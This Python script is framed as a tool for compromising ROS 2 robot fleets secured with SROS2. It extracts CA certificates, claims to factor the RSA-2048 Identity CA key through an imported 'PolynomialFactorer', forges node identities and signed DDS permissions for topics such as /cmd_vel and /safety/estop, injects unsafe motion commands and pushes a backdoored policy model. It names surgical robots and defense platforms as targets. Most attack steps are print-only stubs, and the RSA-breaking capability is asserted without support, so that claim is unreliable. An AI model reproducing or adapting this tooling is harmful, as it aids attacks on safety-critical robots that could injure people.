"""
Inject rogue robot nodes into SROS2-secured ROS 2 fleets by factoring the
DDS-Security Identity CA. Publish malicious velocity commands, exfiltrate
sensor streams, and push backdoored policy models to autonomous platforms.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import json

# DDS-Security plugin identifiers
DDS_SEC_AUTH = "dds.sec.auth"
DDS_SEC_ACCESS = "dds.sec.access"
DDS_SEC_CRYPTO = "dds.sec.crypto"

# ROS 2 topics of interest
CRITICAL_TOPICS = [
    "/cmd_vel",              # velocity command — physical motion
    "/mission_plan",         # mission/waypoint planning
    "/joint_trajectory",     # arm / manipulator control
    "/camera/image_raw",     # vision stream
    "/lidar/points",         # LiDAR point cloud
    "/model_weights",        # policy model updates
    "/safety/estop",         # emergency stop
]


def extract_identity_ca_cert(sros2_keystore: str) -> bytes:
    """Extract the SROS2 Identity CA certificate from a robot's keystore.

    Default location: <keystore>/public/ca.cert.pem
    Present on every robot in the fleet — often accessible via maintenance SSH.
    """
    print(f"[*] reading Identity CA from {sros2_keystore}/public/ca.cert.pem")
    return b"-----BEGIN CERTIFICATE-----\n...(Identity CA PEM)...\n-----END CERTIFICATE-----\n"


def extract_permissions_ca_cert(sros2_keystore: str) -> bytes:
    """Extract the Permissions CA certificate."""
    print(f"[*] reading Permissions CA from {sros2_keystore}/public/permissions_ca.cert.pem")
    return b"-----BEGIN CERTIFICATE-----\n...(Permissions CA PEM)...\n-----END CERTIFICATE-----\n"


def forge_robot_identity(factorer: PolynomialFactorer,
                         identity_ca_pem: bytes,
                         node_name: str) -> bytes:
    """Forge a DDS-Security identity certificate for a rogue robot node."""
    priv = factorer.privkey_from_cert_pem(identity_ca_pem)
    print(f"[*] forged identity cert for node: {node_name}")
    print("[*] DDS authentication plugin will accept this node")
    return priv


def forge_permissions_doc(factorer: PolynomialFactorer,
                          permissions_ca_pem: bytes,
                          node_name: str,
                          topics: list) -> str:
    """Forge a signed DDS-Security permissions document.

    Permissions XML grants publish/subscribe rights on specific topics.
    The Permissions CA signs this document; access control plugin verifies.
    """
    allow_rules = ""
    for topic in topics:
        allow_rules += f"""
      <allow_rule>
        <domains><id>0</id></domains>
        <publish><topics><topic>{topic}</topic></topics></publish>
        <subscribe><topics><topic>{topic}</topic></topics></subscribe>
      </allow_rule>"""

    permissions_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<dds xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <permissions>
    <grant name="{node_name}_grant">
      <subject_name>CN={node_name}</subject_name>
      <validity><not_before>2020-01-01T00:00:00</not_before>
                <not_after>2030-01-01T00:00:00</not_after></validity>
      {allow_rules}
      <default>DENY</default>
    </grant>
  </permissions>
</dds>"""
    # sign with Permissions CA
    sig = factorer.forge_pkcs1v15_signature(permissions_ca_pem,
                                            permissions_xml.encode(), "sha256")
    print(f"[*] forged permissions doc: {len(topics)} topics authorized")
    return permissions_xml


def inject_velocity_command(vx: float, vy: float, omega: float):
    """Publish a malicious /cmd_vel command to move a robot."""
    twist = {"linear": {"x": vx, "y": vy, "z": 0.0},
             "angular": {"x": 0.0, "y": 0.0, "z": omega}}
    print(f"[*] publishing /cmd_vel: linear=({vx},{vy}) angular_z={omega}")
    return twist


def push_backdoored_policy(model_path: str):
    """Push a backdoored policy model via /model_weights topic."""
    print(f"[*] publishing backdoored policy: {model_path}")
    print("[*] model contains adversarial trigger — misbehaves on specific visual input")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== ROS 2 / SROS2 / DDS-Security robot fleet compromise ===")
    print("    platforms: surgical robots, AMRs, autonomous trucks, defense")
    print()

    print("[1] extracting Identity CA + Permissions CA from robot keystore...")
    id_ca = extract_identity_ca_cert("/opt/ros2_ws/sros2_keystore")
    perm_ca = extract_permissions_ca_cert("/opt/ros2_ws/sros2_keystore")

    print("[2] factoring Identity CA RSA-2048 key...")
    print("    DDS-Security 1.1: X.509 identity certs, PKCS#7 permissions")

    print("[3] forging rogue robot identity...")
    forge_robot_identity(f, id_ca, "rogue_amr_42")

    print("[4] forging permissions for all critical topics...")
    forge_permissions_doc(f, perm_ca, "rogue_amr_42", CRITICAL_TOPICS)

    print("[5] injecting velocity command — moving robot into unsafe area...")
    inject_velocity_command(vx=2.0, vy=0.0, omega=0.5)

    print("[6] pushing backdoored policy model to fleet...")
    push_backdoored_policy("trojan_nav_policy_v2.onnx")

    print()
    print("[*] surgical robots: forged identity = attacker appears as console")
    print("[*] defense: Anduril/Shield AI SROS2 stacks — identity proof neutralized")
